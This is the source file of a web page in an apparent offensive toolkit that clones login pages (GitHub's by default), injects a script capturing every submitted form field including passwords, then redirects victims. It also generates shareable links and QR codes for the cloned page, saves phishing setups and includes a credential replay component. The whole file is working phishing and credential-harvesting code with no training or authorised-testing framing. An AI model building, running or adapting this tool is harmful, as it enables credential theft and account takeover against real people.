
'use client';

import { useState, useEffect, useRef } from 'react';
import type { CapturedCredential } from '@/components/credential-harvester';
import { useToast } from '@/hooks/use-toast';
import { CredentialHarvester } from '@/components/credential-harvester';
import { QrCodeGenerator } from '@/components/qr-code-generator';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, Clipboard, Globe, Wand, StopCircle, Share2, Save, Trash2 } from 'lucide-react';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Textarea } from '@/components/ui/textarea';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Dialog, DialogTrigger, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
import { Separator } from '@/components/ui/separator';
import { CredentialReplayer } from '@/components/credential-replayer';

const clonerSchema = z.object({
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
  urlToClone: z.string().optional(),
  htmlContent: z.string().optional(),
}).refine(data => data.urlToClone || data.htmlContent, {
  message: 'Either a URL or HTML content is required.',
  path: ['urlToClone'],
});

type PhishingSetup = {
  id: string;
  name: string;
  targetUrl?: string;
  htmlContent?: string;
  redirectUrl: string;
  createdAt: string;
};

const storageKey = 'netra-captured-credentials';
const setupsStorageKey = 'netra-phishing-setups';

export default function PhishingPage() {
  const { toast } = useToast();
  const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
  const { user } = useAuth();

  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [hostedUrl, setHostedUrl] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isHosting, setIsHosting] = useState(false);
  
  const [savedSetups, setSavedSetups] = useState<PhishingSetup[]>([]);
  const [isSaveModalOpen, setIsSaveModalOpen] = useState(false);
  const [saveSetupName, setSaveSetupName] = useState('');


  const form = useForm<z.infer<typeof clonerSchema>>({
    resolver: zodResolver(clonerSchema),
    defaultValues: {
      redirectUrl: 'https://github.com/password_reset',
      urlToClone: 'https://github.com/login',
      htmlContent: '',
    },
  });

  const loadDataFromStorage = () => {
    try {
        const storedCreds = localStorage.getItem(storageKey);
        setCapturedCredentials(storedCreds ? JSON.parse(storedCreds) : []);

        const storedSetups = localStorage.getItem(setupsStorageKey);
        setSavedSetups(storedSetups ? JSON.parse(storedSetups) : []);
    } catch (error) {
        console.error('Failed to load data from localStorage', error);
    }
  };

  useEffect(() => {
    loadDataFromStorage();
  }, []);
  
  useEffect(() => {
    const handleStorageChange = (event: StorageEvent) => {
      if (event.key === storageKey && event.newValue) {
        try {
            const newCredsList = JSON.parse(event.newValue);
             if(newCredsList.length > capturedCredentials.length) {
                 toast({
                  variant: "destructive",
                  title: "Credentials Captured!",
                  description: "New credentials have been harvested.",
                });
            }
            setCapturedCredentials(newCredsList);
        } catch (e) {
            console.error('Failed to parse credentials from storage event.', e);
        }
      }
    };

    window.addEventListener('storage', handleStorageChange);
    return () => {
      window.removeEventListener('storage', handleStorageChange);
    };
  }, [capturedCredentials.length, toast]);


  const handleClearCredentials = () => {
    setCapturedCredentials([]);
    localStorage.removeItem(storageKey);
  };
  
  const resetState = () => {
    setModifiedHtml(null);
    setHostedUrl(null);
    setIsProcessing(false);
    setIsHosting(false);
    form.reset({
      redirectUrl: 'https://github.com/password_reset',
      urlToClone: 'https://github.com/login',
      htmlContent: '',
    });
  };

  const getHarvesterScript = (redirectUrl: string) => `
    <script>
      function captureAndRedirect(form) {
        try {
          const formData = new FormData(form);
          const credentials = {};
          let capturedData = false;

          for (let [key, value] of formData.entries()) {
            if (typeof value === 'string' && value.length > 0) {
              credentials[key] = value;
              capturedData = true;
            }
          }

          if (capturedData) {
            const entry = {
              ...credentials,
              source: window.location.href,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent
            };
            
            try {
              const existingData = JSON.parse(localStorage.getItem('${storageKey}') || '[]');
              const updatedData = [...existingData, entry];
              localStorage.setItem('${storageKey}', JSON.stringify(updatedData));

              // This event notifies our main app window that new credentials were captured.
              window.dispatchEvent(new StorageEvent('storage', {
                key: '${storageKey}',
                newValue: JSON.stringify(updatedData)
              }));
            } catch(e) {
              console.error('NETRA-X Harvester: Could not save to localStorage.', e);
            }
          }
        } catch (e) {
          console.error('NETRA-X Harvester: Error capturing form data.', e);
        } finally {
          // Redirect after a short delay to ensure storage event fires.
          setTimeout(() => {
            window.location.href = '${redirectUrl}';
          }, 150);
        }
      }

      // Intercept form submissions
      document.addEventListener('submit', function(e) {
        if (e.target && e.target.tagName === 'FORM') {
          e.preventDefault();
          e.stopPropagation();
          captureAndRedirect(e.target);
        }
      }, true);
    </script>
    `;

  const processAndInject = async (values: z.infer<typeof clonerSchema>) => {
    setIsProcessing(true);
    setModifiedHtml(null);
    setHostedUrl(null);

    try {
      let originalHtml = values.htmlContent;
      let baseHrefUrl = values.urlToClone;

      if (values.urlToClone) {
        toast({ title: 'Cloning Page...', description: 'Fetching HTML content from the URL.' });
        const response = await clonePageFromUrl({ url: values.urlToClone });
        originalHtml = response.htmlContent;
        form.setValue('htmlContent', originalHtml);
      } else if (originalHtml) {
        const actionMatch = originalHtml.match(/action="([^"]+)"/);
        baseHrefUrl = (actionMatch && actionMatch[1].startsWith('http'))
          ? new URL(actionMatch[1]).origin
          : new URL(values.redirectUrl).origin;
      }

      if (!originalHtml) {
        throw new Error('No HTML content to process.');
      }

      let html = originalHtml;
      const harvesterScript = getHarvesterScript(values.redirectUrl);
      
      // Inject <base> tag to fix relative links
      if (baseHrefUrl) {
        if (html.includes('<head>')) {
          html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
        } else {
          html = `<head><base href="${baseHrefUrl}"></head>${html}`;
        }
      }

      // Inject harvester script
      if (html.includes('</body>')) {
          html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
      } else {
          html += harvesterScript;
      }

      setModifiedHtml(html);
      toast({ title: 'HTML Prepared', description: 'Raw HTML is ready for hosting.' });
    } catch (e) {
      const error = e instanceof Error ? e.message : 'An unknown error occurred';
      toast({ variant: 'destructive', title: 'Processing Failed', description: error });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleGenerateLink = async () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    
    try {
        const pageId = crypto.randomUUID();
        const pageStorageKey = `phishing-html-${pageId}`;
        localStorage.setItem(pageStorageKey, modifiedHtml);

        const finalUrl = `${window.location.origin}/phish/${pageId}`;
        setHostedUrl(finalUrl);
        toast({ title: "Local Link Generated!", description: "Your phishing page is ready to be used." });

        const urlToClone = form.getValues('urlToClone');
        logActivity({
            user: user?.displayName || 'Operator',
            action: 'Generated Phishing Link',
            details: `Source: ${urlToClone || 'Pasted HTML'}`,
        });
    } catch(err) {
        const error = err instanceof Error ? err.message : "An unknown error occurred";
        toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
    } finally {
        setIsHosting(false);
    }
  };
  
  const handleCopyUrl = () => {
    if (hostedUrl) {
      navigator.clipboard.writeText(hostedUrl);
      toast({ title: 'Copied!', description: 'Hosted URL copied to clipboard.' });
    }
  };
  
  const handleSaveSetup = () => {
    if (!saveSetupName.trim()) {
        toast({ variant: 'destructive', title: "Name required", description: "Please enter a name for the setup." });
        return;
    }
    const currentValues = form.getValues();
    const newSetup: PhishingSetup = {
        id: crypto.randomUUID(),
        name: saveSetupName,
        targetUrl: currentValues.urlToClone,
        htmlContent: currentValues.htmlContent,
        redirectUrl: currentValues.redirectUrl,
        createdAt: new Date().toISOString(),
    };
    const updatedSetups = [...savedSetups, newSetup];
    setSavedSetups(updatedSetups);
    localStorage.setItem(setupsStorageKey, JSON.stringify(updatedSetups));
    toast({ title: "Setup Saved", description: `"${saveSetupName}" has been saved.`});
    setIsSaveModalOpen(false);
    setSaveSetupName('');
  };

  const handleLoadSetup = (setup: PhishingSetup) => {
    form.reset({
        urlToClone: setup.targetUrl || '',
        htmlContent: setup.htmlContent || '',
        redirectUrl: setup.redirectUrl,
    });
    setModifiedHtml(null);
    setHostedUrl(null);
    toast({ title: "Setup Loaded", description: `"${setup.name}" has been loaded into the form.`});
  };

  const handleDeleteSetup = (setupId: string) => {
    const updatedSetups = savedSetups.filter(s => s.id !== setupId);
    setSavedSetups(updatedSetups);
    localStorage.setItem(setupsStorageKey, JSON.stringify(updatedSetups));
    toast({ title: "Setup Deleted", description: "The saved setup has been removed."});
  };

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Page Cloner & Credential Harvester</h1>
        <p className="text-muted-foreground">Clone a login page, inject a harvester, and capture credentials in real-time.</p>
      </div>

      <div className="grid lg:grid-cols-2 gap-6 items-start">
        <div className="flex flex-col gap-6">
            <Card>
                <CardHeader>
                <CardTitle>Page Cloner & Harvester Setup</CardTitle>
                <CardDescription>Clone a page from a URL or paste HTML to inject the harvester script.</CardDescription>
                </CardHeader>
                <Form {...form}>
                <form onSubmit={form.handleSubmit(processAndInject)}>
                    <CardContent className="space-y-4">
                    <Tabs defaultValue="url" className="w-full">
                        <TabsList className="grid w-full grid-cols-2">
                        <TabsTrigger value="url">Clone from URL</TabsTrigger>
                        <TabsTrigger value="html">Paste HTML</TabsTrigger>
                        </TabsList>
                        <TabsContent value="url" className="mt-4">
                        <FormField
                            control={form.control}
                            name="urlToClone"
                            render={({ field }) => (
                            <FormItem>
                                <FormLabel>Target Page URL</FormLabel>
                                <FormControl>
                                <Input placeholder="https://example.com/login" {...field} value={field.value ?? ''} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                            )}
                        />
                        </TabsContent>
                        <TabsContent value="html" className="mt-4">
                        <FormField
                            control={form.control}
                            name="htmlContent"
                            render={({ field }) => (
                            <FormItem>
                                <FormLabel>HTML Source Code</FormLabel>
                                <FormControl>
                                <Textarea placeholder="Paste page source here..." {...field} value={field.value ?? ''} className="h-40 font-mono" />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                            )}
                        />
                        </TabsContent>
                    </Tabs>
                    <FormField
                        control={form.control}
                        name="redirectUrl"
                        render={({ field }) => (
                        <FormItem>
                            <FormLabel>Redirect URL (after capture)</FormLabel>
                            <FormControl>
                            <Input placeholder="https://example.com/login_failed" {...field} />
                            </FormControl>
                            <FormMessage />
                        </FormItem>
                        )}
                    />
                    <Button type="submit" className="w-full" disabled={isProcessing}>
                        {isProcessing ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
                        Process HTML
                    </Button>
                    </CardContent>
                    {modifiedHtml && (
                    <CardFooter className="flex-col items-start gap-4">
                        <CardTitle className="text-xl">Generate & Save</CardTitle>
                        <div className="w-full flex gap-2">
                            <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                                {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
                                Generate Local Link
                            </Button>
                             <Dialog open={isSaveModalOpen} onOpenChange={setIsSaveModalOpen}>
                                <DialogTrigger asChild>
                                    <Button type="button" variant="secondary"><Save className="mr-2 h-4 w-4" />Save Setup</Button>
                                </DialogTrigger>
                                <DialogContent>
                                    <DialogHeader>
                                        <DialogTitle>Save Phishing Setup</DialogTitle>
                                        <DialogDescription>Enter a name to save this configuration for later use.</DialogDescription>
                                    </DialogHeader>
                                    <div className="py-4">
                                        <Input value={saveSetupName} onChange={(e) => setSaveSetupName(e.target.value)} placeholder="e.g., GitHub Login Page"/>
                                    </div>
                                    <DialogFooter>
                                        <Button variant="outline" onClick={() => setIsSaveModalOpen(false)}>Cancel</Button>
                                        <Button onClick={handleSaveSetup}>Save</Button>
                                    </DialogFooter>
                                </DialogContent>
                            </Dialog>
                        </div>
                        <Button type="button" onClick={resetState} variant="destructive" className="w-full">
                            <StopCircle className="mr-2 h-4 w-4" /> Reset Cloner
                        </Button>
                    </CardFooter>
                    )}
                </form>
                </Form>
            </Card>
          
          {hostedUrl && (
             <div className="grid md:grid-cols-2 gap-4">
                <Card>
                    <CardHeader>
                        <CardTitle>Hosted Page URL</CardTitle>
                    </CardHeader>
                    <CardContent>
                        <div className="flex w-full items-center gap-2">
                            <Input readOnly value={hostedUrl} className="font-mono" />
                            <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
                                <Clipboard className="h-4 w-4" />
                            </Button>
                        </div>
                    </CardContent>
                </Card>
                <QrCodeGenerator url={hostedUrl} />
             </div>
           )}

            <Card>
                <CardHeader>
                    <CardTitle>Saved Setups</CardTitle>
                    <CardDescription>Load a previously saved phishing page configuration.</CardDescription>
                </CardHeader>
                <CardContent>
                    <div className="border rounded-md max-h-80 overflow-y-auto">
                        <Table>
                            <TableHeader>
                                <TableRow>
                                    <TableHead>Name</TableHead>
                                    <TableHead>Target</TableHead>
                                    <TableHead className="text-right">Actions</TableHead>
                                </TableRow>
                            </TableHeader>
                            <TableBody>
                                {savedSetups.length === 0 && <TableRow><TableCell colSpan={3} className="text-center h-24">No saved setups.</TableCell></TableRow>}
                                {savedSetups.map(setup => (
                                    <TableRow key={setup.id}>
                                        <TableCell className="font-semibold">{setup.name}</TableCell>
                                        <TableCell className="text-muted-foreground truncate max-w-xs">{setup.targetUrl || 'Pasted HTML'}</TableCell>
                                        <TableCell className="text-right">
                                            <Button variant="outline" size="sm" onClick={() => handleLoadSetup(setup)} className="mr-2">Load</Button>
                                            <Button variant="ghost" size="icon" onClick={() => handleDeleteSetup(setup.id)}><Trash2 className="h-4 w-4 text-destructive"/></Button>
                                        </TableCell>
                                    </TableRow>
                                ))}
                            </TableBody>
                        </Table>
                    </div>
                </CardContent>
            </Card>
        </div>
        
        <div className="flex flex-col gap-6">
          <CredentialHarvester 
            credentials={capturedCredentials} 
            onClear={handleClearCredentials} 
            onRefresh={loadDataFromStorage} 
          />
        </div>
      </div>
      
      <Separator className="my-8" />
      <CredentialReplayer />
      <Separator className="my-8" />
      <AdvancedPageCloner />
    </div>
  );
}
